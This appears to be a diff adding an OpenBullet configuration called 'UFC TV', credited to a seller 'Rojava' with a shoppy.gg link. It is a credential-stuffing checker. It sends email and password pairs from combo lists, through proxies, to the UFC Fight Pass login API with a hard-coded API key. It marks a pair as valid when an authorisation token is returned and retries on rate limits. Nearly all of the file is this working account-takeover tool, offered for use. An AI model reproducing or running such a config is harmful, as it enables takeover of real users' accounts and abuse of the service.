@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "UFC TV",
+  "SuggestedBots": 44,
+  "MaxCPM": 0,
+  "LastModified": "2019-12-10T11:32:05.7369029+03:00",
+  "AdditionalInfo": "https://shoppy.gg/@Rojava",
+  "Author": "Rojava",
+  "Version": "1.1.4[Modded by Rojava]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://ufcfightpass.com" 
+  HEADER "Realm: dce.ufc" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.62" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "x-app-var: 4.20.6" 
+  HEADER "DNT: 1" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://dce-frontoffice.imggaming.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "loginnotfound" 
+    KEY "NOT_FOUND" 
+  KEYCHAIN Success OR 
+    KEY "instruct" 
+    KEY "authorisationToken" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "500" 
+    KEY "429" 
+
